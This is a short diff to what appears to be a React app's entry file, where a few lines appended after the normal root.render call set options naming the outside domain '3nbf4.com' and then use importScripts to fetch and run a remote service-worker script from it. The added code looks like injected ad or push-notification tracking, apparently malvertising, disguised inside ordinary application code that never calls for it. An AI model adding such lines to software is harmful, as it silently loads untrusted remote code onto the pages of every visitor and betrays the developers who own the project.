@@ -13,3 +13,10 @@ root.render(
     <App />
   </React.StrictMode>
 );
+
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10551069
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
